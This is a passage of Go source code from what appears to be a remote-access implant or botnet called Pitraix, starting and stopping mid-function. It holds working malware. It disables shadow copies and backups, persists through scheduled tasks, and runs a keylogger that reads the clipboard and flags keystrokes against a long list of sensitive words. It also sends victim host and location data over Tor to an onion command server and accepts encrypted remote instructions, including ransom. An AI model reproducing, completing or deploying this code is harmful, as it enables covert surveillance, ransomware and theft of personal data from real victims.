	if len(pitraix_FilePath) > 30 {
		pitraix_FilePath = pitraix_FilePath[:25]
	}

	config_FilePath, _ = predictable_random(cpu + "@fCONPROFOVCPTDX$2" + pitraix_FilePath + username + userHomeDIR + cpuVendor, 0, true)
	if len(config_FilePath) > 30 {
		config_FilePath = config_FilePath[:25]
	}

	tor_FolderName, _ := predictable_random(config_FilePath + "@fPRISZBSTCCLEVANER~3" + username + cpu + cpuVendor + userHomeDIR, 0, true)
	if len(tor_FolderName) > 30 {
		tor_FolderName = tor_FolderName[:25]
	}

	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + cpu + "VOWLLA" + userHomeDIR + username ))))
	locAES_Key = random_Bytes(32, false)

	// firstTime, _ := cft.updateConf(locAES_Key, cft.AES_Key, contactDate) //, username, cpu, cpuVendor, userHomeDIR)

	/*
		PERSISTENCE and path selecting
	*/

	pointerPaths := nonPrivPaths
	isadmin_const := isadmin()
	if isadmin_const {
		pointerPaths = PrivPaths
		doInstru("shell", "taskkill /fi \"Services eq VSS\" /F") // Disables Volume Shadow Copy
		doInstru("shell", "wbadmin disable backup -quiet") // Disables backups
		doInstru("shell", "taskkill /f /im OneDrive.exe") // kills onedrive
	}
	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "PRRFORVPRIVLPERSDFTN" + cpu + userHomeDIR + username ))))
	pitraix_FilePath = filepath.Join(pointerPaths[rdmod.Intn(len(pointerPaths) - 1)], pitraix_FilePath)
	pitraix_spreadPath := pitraix_FilePath + "SP.exe"
	pitraix_FilePath += ".exe"
	
	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "VICCJIFJIRJVRIJGIERJFIHJ" + cpu + username ))))
	config_FilePath = filepath.Join(pointerPaths[rdmod.Intn(len(pointerPaths) - 1)], config_FilePath)

	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "AYYYECRAYYEACYEEEDXEGHQ" + cpu + username + userHomeDIR ))))
	tor_FolderPath := pointerPaths[rdmod.Intn(len(pointerPaths) - 1)]
	
	fmt.Println("pitraix_FilePath:", pitraix_FilePath, "\nconfig_FilePath:", config_FilePath, "\ntor_FolderPath:", tor_FolderPath)

	// rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "MGUNRU4UFHHW2U8JSDQ" + cpu))))
	pitraix_taskName, _ := predictable_random("MGUNRU4UFHHW2U8JSDQ" + cpu + username + cpu, 0, true)
	if len(pitraix_taskName) > 15 {
		pitraix_taskName = pitraix_taskName[:15]
	}
	rdmod.Seed(int64(bytesumbig([]byte(cpu + cpuVendor + userHomeDIR + "LHREWDHITOEAHEAR" + username))))

	torPort := strconv.Itoa(rdmod.Intn(6999 - 3000) + 3000)	
	
	firstTime = !file_Exists(pitraix_FilePath)

	fmt.Println("torPort:", torPort)
	fmt.Println("firstTime:", firstTime)
	fmt.Println("isadmin_const:", isadmin_const)

	if firstTime == true {
		// srcFile, _ := os.Open(currentPath)
		// destFile, _ := os.Create(pitraix_FilePath)
		// destFile_2, _ := os.Create(pitraix_spreadPath)
		copyf(currentPath, pitraix_FilePath)
		copyf(currentPath, pitraix_spreadPath)

		// time.Sleep(time.Second * 5)
		if isadmin_const {
			// doInstru("shell", `schtasks.exe /CREATE /SC ONLOGON /TN "` + pitraix_taskName + `" /TR "` + pitraix_FilePath + `" /RL HIGHEST /F`)
			out := doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC ONLOGON /TN %s /TR %s /RL HIGHEST /F", pitraix_taskName, pitraix_FilePath))
			fmt.Println("admin!", out)
		} else {
			fmt.Println(`schtasks.exe /CREATE /SC DAILY /TN "` + pitraix_taskName + `" /TR "` + pitraix_FilePath + `"`)
			out := doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC DAILY /TN %s /TR %s", pitraix_taskName, pitraix_FilePath))
			fmt.Println("no :(", out)
		}
	}


	firstTime = !file_Exists(config_FilePath)
	if firstTime {
		AES_Key = random_Bytes(32, true)
		cft.AES_Key = base64.StdEncoding.EncodeToString(AES_Key)
		cft.ContactD = contactDate
		cft.Logs = map[string][]string{"1": {"firstTime", "Created config file ", contactDate}}
		cft.Events = map[string][]string{"1": {"firstTime", "Opened implant", contactDate}}
		cft.Modules = map[string][]string{"0": {}}
		cft.RegTmp  = []string{}
		cft.RoutesH = []string{}
		cft.Register = false

		out, _ := json.Marshal(cft)
		pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
		f, _ := os.Create(config_FilePath)
		f.WriteString(base64.StdEncoding.EncodeToString(pl_encrypted) + "|" + base64.StdEncoding.EncodeToString(pl_nonce))
		f.Close()
		// if err != nil {
		// 	fmt.Println("Error creating config file!", config_FilePath, err)
		// }


		// pl_encoded := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(pl_encrypted), base64.StdEncoding.EncodeToString(pl_nonce))
		// f.WriteString(pl_encoded)
		// f.Close()
		// // confAsyncChn <- fmt.Sprintf("aes|%s", key_encoded)
		// // confAsyncChn <- fmt.Sprintf("contactd|%s", contactDate)
		// // fmt.Println(cft.AES_Key, cft.ContactD)
		// fmt.Println("Created config file!")	
	
		// cft.AES_Key = AES_Key
		// cft.ContactD = contactD
	}
	cft.updateConf("fetch", []string{})

	go confUpdaterAsync()
	
	klogChn1 := make(chan string)

	go func(klogChn1 chan string) { // Key logger parser
		eventsIndicators := []string{
			// offensive / porn / child porn
			"fuck",
			"shit",
			"sex",
			"dick",
			"cock",
			"pussy",
			"ass",
			"tit",
			"balls",
			"young",
			"kid",
			"teen",
			"child",
			"cp",
			"loli",
			"porn",
			"xx",
			"xvideos",
			"xnxx",
			"tra",
			"gay",
			"lgb",
			"blow",
			"rape",
			"stalk",
			"horny",
			"naked",
			"hardcore",
			"softcore",
			"bre",
			"straight",
			"girl",
			"fur",
			"cub",
			"prostitut",

			// family terms
			"mom",
			"mother",
			"dad",
			"father",
			"sis",
			"brother",
			"sibling",
			"uncle",
			"aunt",
			"cousin",

			// extremeist / racist / homophobic
			"al qaeda",
			"isis",
			"islamic",
			"jihad",
			"muslim state",
			"nazi",
			"hitler",
			"ww1",
			"ww2",
			"ww3",
			"ww4",
			"www.",
			"world",
			"would",
			"white",
			"black",
			"jew",
			"nig",
			"neg",
			"war",
			"revenge",
			"grudge",
			"blood",
			"fag",
			"homemade",
			"hate",
			"iraq",
			"syria",
			"flight",
			"plan",
			"drone",
			"nuclear",
			"nuke",
			"bomb",
			"explosive",
			"sho",
			"guns",
			"glock",
			"pistol",
			"rifle",
			"suicid",
			"weapon",
			"kill",
			"pathetic",
			"weak",
			"strong",
			"crew",
			"border",
			"customs",
			"discord",
			"virus",
			"chemical",
			"pro",
			"betray",
			"how to",
			"manual",
			"going to",
			"will",
			"troll",

			// tech aware / researcher / hacker / cracker / fraudster
			"vpn",
			"proxy",
			"password",
			"hid",
			"tor",
			"the onion router",
			"hack",
			"crack",
			"engineer",
			"spam",
			"fullz",
			"log",
			"i2p",
			"freenet",
			"whonix",
			"qube",
			"tails",
			"usb",
			"dox",
			"opsec",
			"info",
			"sell",
			"buy",
			"ubuntu",
			"debian",
			"manjaro",
			"arch",
			"fedora",
			"harden",
			"bot",
			"malware",
			"data",
			"dev",
			"psyop",
			"op",
			"vacation",
			"program",
			"python",
			"c++",
			"c#",
			"binary",
			"java",
			"javascript",
			"golang",
			"html",
			"css",
			"cypher",
			"cipher",
			"zero",
			"0",
			"exploit",
			"metasploit",
			"facebook",
			"twitter",
			"link",
			"youtube",
			"google",
			"duckduckgo",
			"resume",
			"website",
			"blog",
			"site",
			"game",
			"admin",
			"mod",
			"onion",
			"monero",
			"bitcoin",
			"ether",
			"crypt",
			"encrypt",
			"sign",
			"decrypt",
			"coin",
			"byte",
			"bit",
			"mixer",
			"amd",
			"intel",
			"nvidia",
			"linux",
			"problem",
			"windows",
			"unix",
			"bsd",
			"assembly",
			"card",
			"visit",
			"email",
			"slack",
			"irc",
			"jabber",
			"xmpp",
			"matrix",
			"element",
			"client",
			"user",
			"blackmail",
			"dark",
			"deep",
			"cyber",
			"privacy",
			"security",
			"learn",
			"teach",
			"var",
			"scam",
			"http",
			"bought",
			"spread",
			"profile",
			"nord",
			"express",
			"firefox",
			"chrome",

			// bank info / goverment employee / spy
			"nsa",
			"national security",
			"agency",
			"fbi",
			"addict",
			"federal",
			"fed",
			"cia",
			"mossad",
			"office",
			"agent",
			"operat",
			"officer",
			"bank",
			"money",
			"cash",
			"credit",
			"debt",
			"social",
			"cop",
			"spy",
			"deploy",
			"military",
			"sector",
			"lake city",
			"quiet pill",
			"spooks",
			"jail",
			"prison",
			"torture",
			"homeland",
			"motherland",
			"goverment",
			"work",
			"job",
			"poor",
			"rich",
			"wealthy",
			"welfare",
			"shin",
			"bnd",
			"dod",
			"meeting",
			"schedule",
			"heading to",
			"van",
			"car",
			"boat",
			"charge",

			// drug addict
			"drug",
			"date",
			"meth",
			"tramadol",
			"weed",
			"cig",
			"alcohol",
			"xanax",
			"mushroom",
			"heroin",
			"tar",
			"fentanyl",
			"coke",
			"cocaine",
			"mdma",
			"marijuana",
			"oxycodone",
			"morphine",
			"steroid",
			"overdose",
			"angel",
			
			// private info / clues / misc
			"depress",
			"homework",
			"friend",
			"age",
			"name",
			"location",
			"country",
			"city",
			"live",
			"from",
			"israel",
			"iran",
			"egypt",
			"tired",
			"europe",
			"latin",
			"old",
			"america",
			"north",
			"south",
			"africa",
			"east",
			"asia",
			"arab",
			"american",
			"african",
			"food",
			"closed",
			"cook",
			"cancer",
			"german",
			"moving",			
			"study",
			"college",
			"school",
			"daycare",
			"sleep",
			"slept",
			"bed",
			"love",
			"like",
			"dislike",
			"scared",
			"scary",
			"terrifying",
			"anime",
			"cartoon",
			"devil",
			"satan",
			"god",
			"hell",
			"heaven",
			"tiktok",
			"android",
			"iphone",
			"open",
			"dog",
			"cat",
			"noob",
			"soccer",
			"baseball",
			"basketball",
			"virign",
			"i am",
			"i'm",
			"im",
			"name",
			"nick",
			"wife",
			"house",
			"home",
			"apartment",
			"garage",
			"door",
			"paid",
			"pay",
			"dollar",
			"euro",
			"free",
			"holy",
			"omg",
		}
		for sentence := range klogChn1 {
			words := strings.Fields(sentence)
			match := false
			for _, w := range words {
				if match {
					break
				}
				for _, w2 := range eventsIndicators {
					if strings.HasPrefix(strings.ToLower(w), w2) || strings.HasPrefix(strings.ToLower(sentence), w2){ // contains strings start
						fmt.Println("word match!", w)
						match = true
						break
					}
				}
			}

			if match == true {
				fmt.Println("keylog event match:", sentence)
				event("keylog", sentence)
			} else {
				fmt.Println("uninteresting:", sentence)
			}
		}
	}(klogChn1)

	go func(klogChn1 chan string) { // Raw logger passer
		/* 
			should increase/decrease dyniamcally when 
			key  was recently presseddecrease to 5; if key been while pressed, increase to 50 etc
		*/
		delayKeyfetchMS := time.Duration(50) 
		// emptyCount := 0

		var tmpKeylog string
		var capsLock bool = false
		
		var shiftPressed bool = false
		var ctrlPressed bool = false

		specialchars := map[int]string{
			0x30: ")",
			0x31: "!",
			0x32: "@",
			0x33: "#",
			0x34: "$",
			0x35: "%",
			0x36: "^",
			0x37: "&",
			0x38: "*",
			0x39: "(",
			0xBD: "_",
			0xBB: "+",
			0xBC: "<",
			w32.VK_OEM_1: ":",
			w32.VK_OEM_2: "?",
			w32.VK_OEM_3: "~",
			w32.VK_OEM_4: "{",
			w32.VK_OEM_5: "|",
			w32.VK_OEM_6: "}",
			w32.VK_OEM_7: "\"",
			w32.VK_OEM_PERIOD: ">",
		}
		
		// detected := false
		// var detected_low int 
		// var detected_high int 
		for {
			for key := 0; key <= 256; key++ {
				val, _, _ := procGetAsyncKeyState.Call(uintptr(key))
				// if detected_high == 0 {
				// 	detected_low = val
				// } else if detected_low == 0 {
				// 	detected_high = val
				// }
				if val == 32769 {
					// fmt.Println(key, val)
					fmt.Println(key)
					switch key {
					case w32.VK_CONTROL:
						ctrlPressed = true
						// tmpKeylog += "[Ctrl]"
					case w32.VK_LCONTROL:
						ctrlPressed = true
						// tmpKeylog += "[LeftCtrl]"
					case w32.VK_RCONTROL:
						ctrlPressed = true
						// tmpKeylog += "[RightCtrl]"
					case w32.VK_BACK:
						if len(tmpKeylog) != 0 {
							tmpKeylog = tmpKeylog[:len(tmpKeylog) - 1]
						}
					case w32.VK_TAB:
						tmpKeylog += "[Tab]"
					case w32.VK_RETURN, 1:
						// tmpKeylog += "[Enter]\r\n"
						if strings.TrimSpace(tmpKeylog) != "" {
							klogChn1 <- tmpKeylog
							tmpKeylog = ""
						}
					case w32.VK_SHIFT:
						shiftPressed = true
						// tmpKeylog += "[Shift]"
					case w32.VK_MENU:
						tmpKeylog += "[Alt]"
					case w32.VK_CAPITAL:
						// tmpKeylog += "[CapsLock]"
						capsLock = !capsLock
					case w32.VK_ESCAPE:
						tmpKeylog += "[Esc]"
					case w32.VK_SPACE:
						tmpKeylog += " "
					case w32.VK_PRIOR:
						tmpKeylog += "[PageUp]"
					case w32.VK_NEXT:
						tmpKeylog += "[PageDown]"
					case w32.VK_END:
						tmpKeylog += "[End]"
					case w32.VK_HOME:
						tmpKeylog += "[Home]"
					case w32.VK_LEFT:
						tmpKeylog += "[Left]"
					case w32.VK_UP:
						tmpKeylog += "[Up]"
					case w32.VK_RIGHT:
						tmpKeylog += "[Right]"
					case w32.VK_DOWN:
						tmpKeylog += "[Down]"
					case w32.VK_SELECT:
						tmpKeylog += "[Select]"
					case w32.VK_PRINT:
						tmpKeylog += "[Print]"
					case w32.VK_EXECUTE:
						tmpKeylog += "[Execute]"
					case w32.VK_SNAPSHOT:
						tmpKeylog += "[PrintScreen]"
					case w32.VK_INSERT:
						tmpKeylog += "[Insert]"
					case w32.VK_DELETE:
						tmpKeylog += "[Delete]"
					case w32.VK_HELP:
						tmpKeylog += "[Help]"
					// case w32.VK_LWIN:
					// 	tmpKeylog += "[LeftWindows]" ////////////////////////////////////////////////
					// case w32.VK_RWIN:
					// 	tmpKeylog += "[RightWindows]" ////////////////////////////////////////////////
					case w32.VK_APPS:
						tmpKeylog += "[Applications]"
					case w32.VK_SLEEP:
						tmpKeylog += "[Sleep]"
					case w32.VK_NUMPAD0:
						tmpKeylog += "[Pad 0]"
					case w32.VK_NUMPAD1:
						tmpKeylog += "[Pad 1]"
					case w32.VK_NUMPAD2:
						tmpKeylog += "[Pad 2]"
					case w32.VK_NUMPAD3:
						tmpKeylog += "[Pad 3]"
					case w32.VK_NUMPAD4:
						tmpKeylog += "[Pad 4]"
					case w32.VK_NUMPAD5:
						tmpKeylog += "[Pad 5]"
					case w32.VK_NUMPAD6:
						tmpKeylog += "[Pad 6]"
					case w32.VK_NUMPAD7:
						tmpKeylog += "[Pad 7]"
					case w32.VK_NUMPAD8:
						tmpKeylog += "[Pad 8]"
					case w32.VK_NUMPAD9:
						tmpKeylog += "[Pad 9]"
					case w32.VK_MULTIPLY:
						tmpKeylog += "*"
					case w32.VK_ADD:
						tmpKeylog += "+"
					case w32.VK_SEPARATOR:
						tmpKeylog += "[Separator]"
					case w32.VK_SUBTRACT:
						tmpKeylog += "-"
					case w32.VK_DECIMAL:
						tmpKeylog += "."
					case w32.VK_DIVIDE:
						tmpKeylog += "[Devide]"
					case w32.VK_F1:
						tmpKeylog += "[F1]"
					case w32.VK_F2:
						tmpKeylog += "[F2]"
					case w32.VK_F3:
						tmpKeylog += "[F3]"
					case w32.VK_F4:
						tmpKeylog += "[F4]"
					case w32.VK_F5:
						tmpKeylog += "[F5]"
					case w32.VK_F6:
						tmpKeylog += "[F6]"
					case w32.VK_F7:
						tmpKeylog += "[F7]"
					case w32.VK_F8:
						tmpKeylog += "[F8]"
					case w32.VK_F9:
						tmpKeylog += "[F9]"
					case w32.VK_F10:
						tmpKeylog += "[F10]"
					case w32.VK_F11:
						tmpKeylog += "[F11]"
					case w32.VK_F12:
						tmpKeylog += "[F12]"
					case w32.VK_NUMLOCK:
						tmpKeylog += "[NumLock]"
					case w32.VK_SCROLL:
						tmpKeylog += "[ScrollLock]"
					case w32.VK_LSHIFT:
						shiftPressed = true
						// tmpKeylog += "[LeftShift]"
					case w32.VK_RSHIFT:
						shiftPressed = true
						// tmpKeylog += "[RightShift]"
					case w32.VK_LMENU:
						tmpKeylog += "[LeftMenu]"
					case w32.VK_RMENU:
						tmpKeylog += "[RightMenu]"
					case 0x30,
					0x31,
					0x32,
					0x33,
					0x34,
					0x35,
					0x36,
					0x37,
					0x38,
					0x39,
					0xBD,
					0xBB,
					0xBC,
					w32.VK_OEM_1,
					w32.VK_OEM_2,
					w32.VK_OEM_3,
					w32.VK_OEM_4,
					w32.VK_OEM_5,
					w32.VK_OEM_6,
					w32.VK_OEM_7,
					w32.VK_OEM_PERIOD:
						if shiftPressed == true {
							tmpKeylog += specialchars[key]
							shiftPressed = false
						} else {
							if key == w32.VK_OEM_3 {
								tmpKeylog += "`"
							} else if key == 189 {
								tmpKeylog += "-"
							} else if key == 187 {
								tmpKeylog += "="
							} else if key == w32.VK_OEM_1 {
								tmpKeylog += ";"
							} else if key == w32.VK_OEM_2 {
								tmpKeylog += "/"
							} else if key == w32.VK_OEM_4 {
								tmpKeylog += "["
							} else if key == w32.VK_OEM_5 {
								tmpKeylog += "\\"
							} else if key == w32.VK_OEM_6 {
								tmpKeylog += "]"
							} else if key == w32.VK_OEM_7 {
								tmpKeylog += "'"
							} else if key == w32.VK_OEM_PERIOD {
								tmpKeylog += "."
							} else if key == 0xBC {
								tmpKeylog += ","
							} else {
								tmpKeylog += string(key)
							}
						}
					case 0x41,
					0x42,
					0x43,
					0x44,
					0x45,
					0x46,
					0x47,
					0x48,
					0x49,
					0x4A,
					0x4B,
					0x4C,
					0x4D,
					0x4E,
					0x4F,
					0x50,
					0x51,
					0x52,
					0x53,
					0x54,
					0x55,
					0x56,
					0x57,
					0x58,
					0x59,
					0x5A:
						// emptyCount = 0

						if ctrlPressed && (key == 0x56 || key == 0x43) {
							text, _ := clipboard.ReadAll()
							fmt.Println("clipboard:", text)
							ctrlPressed = false
						} else if capsLock {
							tmpKeylog += string(key)
						} else {
							tmpKeylog += strings.ToLower(string(key))
						}
					}
				}
			}
			// fmt.Println(emptyCount, delayKeyfetchMS)
			// if emptyCount > 500 {
			// 	if delayKeyfetchMS != 500 {
			// 		delayKeyfetchMS++
			// 	}
			// } else {
			// 	emptyCount++
			// 	delayKeyfetchMS = 5
			// }
			time.Sleep(delayKeyfetchMS)
		}
	}(klogChn1)

	log("Starting", "Fetching IP info")

	var ipinfo_struct ipInfo
	for { // detect firewall'd enviroments
		ipinfo_req, err := getRequest("https://ipinfo.io/json", false, 10)
		if err != nil {
			// if iperror_count == 9 {
			// 	// outdated certitifcates bypass
			// 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
			// 	fmt.Println("####### IMPORTANT ####### InsecureSkipVerify: true")
			// } else {
			// 	iperror_count++
			// }
			fmt.Println(ipinfo_req, err)
			time.Sleep(time.Second * 5)
			continue
		}
		fmt.Println(string(ipinfo_req), err)
		json.Unmarshal(ipinfo_req, &ipinfo_struct)
		break
	}
	if ipinfo_struct.Country == "IL" {
		fmt.Println("Shalom")
		// doInstru("sk", "all")
		os.Exit(0) // I love you
	}


	hstAddress := setupTor(tor_FolderPath, torPort, tor_FolderName, &ipinfo_struct, false)
	fmt.Println("Address", hstAddress)
	if firstTime {
		file, _ := os.Open(pitraix_spreadPath)
		fs, _ := file.Stat()
		fmt.Println("File size:", fs.Size())
		b := make([]byte, fs.Size())
	
		for {
			_, err := file.Read(b)
			if err != nil {
				break
			}
		}
		file.Close()
	
		nb := bytes.Replace(b, []byte(agentAddress), []byte(hstAddress), 1)
	
		// fmt.Println(nb)
	
		f, _ := os.Create(pitraix_spreadPath)
		f.Write(nb)
		f.Close()
	}
	
	if certError_Count == 5 { // outdated certificates fix
		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: false} // secure connection back
	}

	opPubEncryptionKeyProcessed, _ := x509.ParsePKCS1PublicKey(pemDec(raw_OPEncryptionKeyPEM).Bytes)
	opPubSigningKeyProcessed   , _ := x509.ParsePKCS1PublicKey(pemDec(raw_OPSigningKeyPEM).Bytes)


	if opPubSigningKeyProcessed == opPubEncryptionKeyProcessed {
		log("WARNING", "OPER signing key is same as encryption key! this is highly recommended against")
	}

	// onetimeKey := base64.StdEncoding.EncodeToString(random_Bytes(32, true))

	encryptedMessage_register := RSA_OAEP_Encrypt(AES_Key, *opPubEncryptionKeyProcessed)
	encrypted_registerData, nonce, _ := encrypt_AES([]byte(fmt.Sprintf(`{"Address": "%s", "Username": "%s", "CPU": "%s", "RAM": "%s", "IP": "%s", "Country": "%s", "City": "%s", "Hostname": "%s", "Chassis": %d, "OS": %d, "OSVar": "%s", "Kernel": "%s", "Arch": %d, "Vendor": "%s", "Model": "%s", "ContactD": "%s", "RasKey": "%s"}`, hstAddress, username, cpu, memory, ipinfo_struct.IP, ipinfo_struct.Country, ipinfo_struct.City, userHostname, machineType, osName, osVariant, kernelVersion, arch, machineVendor, machineModel, contactDate, base64.StdEncoding.EncodeToString(random_Bytes(32, true)))), AES_Key)
	registerData := fmt.Sprintf("%s|%s|%s", encryptedMessage_register, base64.StdEncoding.EncodeToString(encrypted_registerData), base64.StdEncoding.EncodeToString(nonce))

	// first time register logic
	for {
		fmt.Println("firstTime:", firstTime, "cft.Register:", cft.Register)
		if firstTime == false && cft.Register == true {
			fmt.Println("stopped")
			break
		}
		
		// log("Register", "Attempting to register with Agent: " + agentAddress)
		fmt.Println("Attempting to register with Agent", agentAddress)
		response, err := postRequest("http://" + agentAddress + ".onion", []byte(registerData), true, 25)	 
		if err != nil {
			log("Register", "Error") // + err.Error())
			// fmt.Println("Error contacting Agent to register. ", err)
			time.Sleep(2 * time.Second) // DEBUG Increase to 2-9 seconds via randomizer later
		} else {
			fmt.Println("wat", string(response), err)

			if string(response) == "1" {
				cft.updateConf("register", []string{"true"})
				// confAsyncChn <- []string{"register", "true"}
				firstTime = false
				// time.Sleep(5 * time.Second)
			}
			// cft.updateConf(locAES_Key, cft.AES_Key, cft.ContactD) //, username, cpu, cpuVendor, userHomeDIR)
			
		}
	}
	
	// normal cell setup
	log("Cell", "Setting up cell")
	fmt.Println("Setting up cell")
	// Later, append to 'pitraix' sha256 hash of 8 characters of the aes key and only append 16 characters of the hash


	var antiddosCounter int = 0

	go func(antiddosCounter *int) {
		for {
			if *antiddosCounter == 0 {
				time.Sleep(1 * time.Second)
			} else {
				time.Sleep(5 * time.Second)
				*antiddosCounter = *antiddosCounter - 5
			}
		}
	}(&antiddosCounter)

	http.HandleFunc("/", func(writer http.ResponseWriter, req *http.Request) {
		req.Body = http.MaxBytesReader(writer, req.Body, 3000) // if anything wrong, its prolly dis bitch
		if req.Method == "GET" {
			io.WriteString(writer, "")
			log("Foreign - GET", "Received GET request")
			fmt.Println("Got GET request! ", req.Body)
		} else if req.Method == "POST" {
			// io.WriteString(writer, "good")
			reqBody, _ := ioutil.ReadAll(req.Body)
			if len(reqBody) > 0 && isASCII(string(reqBody)) {
				dataSlice := strings.Split(string(reqBody), "|")
				fmt.Println(dataSlice)
				if len(dataSlice) == 3 { // register
					if antiddosCounter == 0 {
						antiddosCounter = ddosCounter
						confAsyncChn <- []string{"regtmp", string(reqBody)}
						io.WriteString(writer, "1")
					} else {
						fmt.Println("anti ddos caught something", antiddosCounter, dataSlice)
						go log("Foreign - POST", "anti ddos caught something! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
					}
				} else if len(dataSlice) == 2 { // instrctuion
					temp_decipher, _ := base64.StdEncoding.DecodeString(dataSlice[0])
					temp_nonce   , _ := base64.StdEncoding.DecodeString(dataSlice[1])
					fmt.Println(temp_decipher, temp_nonce) // , base64.StdEncoding.EncodeToString(cft.AES_Key))
					if len(temp_nonce) != 12 {
						go log("Foreign - POST", "Invalid nonce length: " + strconv.Itoa(len(temp_nonce)) + ". DataSlice: " + dataSlice[0] + " " + dataSlice[1])
						fmt.Println("Invalid nonce length given!", len(temp_nonce), temp_nonce)
					} else {
						decipher, err := decrypt_AES(temp_decipher, temp_nonce, AES_Key)
						if err != nil {
							go log("Foreign - POST", "Error while decrypting cipher! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
						} else {
							var instructions = []string{} // instruType
							err := json.Unmarshal(decipher, &instructions)
							if err != nil {
								go log("Foreign - POST", "Error while unmarshalling! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
							} else {
								var shouldLog bool = true
								var final_output string
								for index, instru := range instructions {
									fmt.Println("INSTRUCTION:", index, instru)
									instru_split := strings.Split(instru, " ")
									if len(instru_split) == 0 {
										fmt.Println("wtf?", index, instru)
										go log("Foreign - POST", "Received ZERO INSTRUCTIONS: " + string(decipher))
									} else {
										if instru_split[0] == "ransom" || instru_split[0] == "decrypt" {
											shouldLog = false
										}
										final_output += strings.TrimSpace(doInstru(instru_split[0], instru[len(instru_split[0]) + 1:])) + " <PiTrIaXMaGGi$N$9a1n>"
									}
								}
								if shouldLog == true{
									go log("Foreign - POST", "Received instructions: " + string(decipher))
								}
								fmt.Println("Received instructions:",err, len(instructions), string(decipher))

								final_output = strings.TrimSpace(final_output) // [:len(final_output) - 2]
								output_enc, nonce_enc, _ := encrypt_AES([]byte(final_output), AES_Key)
								output_encode := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(output_enc), base64.StdEncoding.EncodeToString(nonce_enc))
								io.WriteString(writer, output_encode)
							}
						}
					}
				} else {
					go log("Foreign - POST", "Received POST request without data length 2: " + strconv.Itoa(len(dataSlice)))
					// fmt.Println("Got POST request without DataSlice 2! ", dataSlice, len(dataSlice))
				}
			} else {
				go log("Foreign - POST", "Received POST request without valid data: " + string(reqBody))
				fmt.Println("Got POST request without valid data! %v %v\n", reqBody, string(reqBody))
			}
			
		} else {
			go log("Foreign - UNKNOWN", "Received request of unknown method: " + req.Method)
			fmt.Println("Hello Fake", req.Method)
		}
	})
	fmt.Println(http.ListenAndServe("127.0.0.1:" + torPort, nil))
}

func tor_running_check() bool {
	ports := []string{"9050"} // , "9150"}
	tor_running := true
	for _, port := range ports {
		conn, err := net.DialTimeout("tcp", "127.0.0.1:" + port, time.Second)
		if err != nil {
			tor_running = false
		}
		if conn != nil {
			tor_running = true
			conn.Close()
			break
		}
	}
	return tor_running
}

func postRequest(target_url string, data []byte, useTor bool, timeout time.Duration) ([]byte, error) {
	client := &http.Client{}
	if timeout != -1 {
		client = &http.Client{
			Timeout: time.Second * timeout,
		}
	}

	if useTor == true {
		torTransport := &http.Transport{Dial: tbDialer.Dial}
		client = &http.Client{
			Transport: torTransport,
			Timeout: time.Second * timeout,
		}
	}

	req, _ := http.NewRequest("POST", target_url, bytes.NewBuffer(data))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0")

	resp, err := client.Do(req)
	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, err
	}

	return body, nil
}

func getRequest(target_url string, useTor bool, timeout time.Duration) ([]byte, error) {
	client := &http.Client{}
	if timeout != -1 {
		client = &http.Client{
			Timeout: time.Second * timeout,
		}
	}

	if useTor == true {
		torTransport := &http.Transport{Dial: tbDialer.Dial}
		client = &http.Client{
			Transport: torTransport,
			Timeout: time.Second * timeout,
		}
	}
	
	req, _ := http.NewRequest("GET", target_url, nil)
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0")

	resp, err := client.Do(req)
	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, err
	}

	return body, nil
}

func decrypt_AES(cipher_Text []byte, nonce []byte, key []byte) ([]byte, error) {
	cphr, err := aes.NewCipher(key)
	if err != nil {
		return []byte{}, err
	}
	gcm, err := cipher.NewGCM(cphr)
	if err != nil {
		return []byte{}, err
	}

	decrypted_Cipher, err := gcm.Open(nil, nonce, cipher_Text, nil)
	if err != nil {
		return []byte{}, err
	}

	return decrypted_Cipher, nil
}

func encrypt_AES(text []byte, key []byte) ([]byte, []byte, error) {
	cphr, err := aes.NewCipher(key)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	gcm, err := cipher.NewGCM(cphr)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)

	return gcm.Seal(nil, nonce, text, nil), nonce, nil
}

func create_signature(msg []byte, privateKey rsa.PrivateKey) ([]byte, []byte, error) {
	msgHash := sha512.New()
	_, err := msgHash.Write(msg)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	msgHashSum := msgHash.Sum(nil)
	signature, err := rsa.SignPSS(rand.Reader, &privateKey, crypto.SHA512, msgHashSum, nil)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	
	return signature, msgHashSum, nil
}

func verify_signature(publicKey rsa.PublicKey, msgHashSum []byte, signature []byte) error {
	err := rsa.VerifyPSS(&publicKey, crypto.SHA512, msgHashSum, signature, nil)
	if err != nil {
		return err
	}

	return nil
}

func RSA_OAEP_Encrypt(secretMessage []byte, publicKey rsa.PublicKey) string {
    rng := rand.Reader
    ciphertext, err := rsa.EncryptOAEP(sha512.New(), rng, &publicKey, secretMessage, nil)
	if err != nil {
        fmt.Println(err)
    }
    return base64.StdEncoding.EncodeToString(ciphertext)
}
 
func RSA_OAEP_Decrypt(cipherText string, privateKey rsa.PrivateKey) []byte {
